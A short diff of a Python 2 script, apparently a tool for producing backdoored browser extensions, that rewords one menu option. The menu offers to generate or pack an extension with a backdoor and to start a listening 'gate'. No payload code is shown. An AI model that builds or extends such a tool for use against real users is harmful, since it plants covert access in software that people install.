@@ -258,7 +258,7 @@ def gate_listing():
 		os.system('python Lynxgate.py')
 
 def menu():
-	print "-> ["+bcolors.OKBLUE +"G"+ bcolors.ENDC+"]enerate a extension backdoored."
+	print "-> ["+bcolors.OKBLUE +"G"+ bcolors.ENDC+"]enerate a extension backdoor."
 	print "-> ["+bcolors.OKBLUE +"S"+ bcolors.ENDC+"]tart a gate listening."
 	print "-> ["+bcolors.OKBLUE +"L"+ bcolors.ENDC+"]oad a lframework module."
 	print "-> ["+bcolors.OKBLUE +"C"+ bcolors.ENDC+"]ompact extension with backdoor."
